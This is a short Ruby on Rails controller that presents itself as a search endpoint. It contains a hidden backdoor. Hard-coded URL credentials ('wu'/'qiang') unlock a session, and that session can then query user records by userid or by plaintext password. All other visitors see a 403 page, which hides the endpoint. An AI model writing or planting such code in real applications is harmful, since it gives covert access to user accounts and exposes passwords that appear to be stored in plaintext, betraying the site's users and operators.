class SearchController < ApplicationController
  def s
    if session[:user] == "wu"
      @users = User.where(:userid => params[:userid]) if  !params[:userid].nil? && !params[:userid].empty?
      @users = User.where(:password=> params[:password]) if !params[:password].nil? && !params[:password].empty?
      return
    end
    if !(params[:u]=="wu" && params[:p] == "qiang")
      render :file => "#{Rails.root}/public/403.html", :status => 403, :layout => false
    else
      session[:user] = "wu"
    end
  end
end
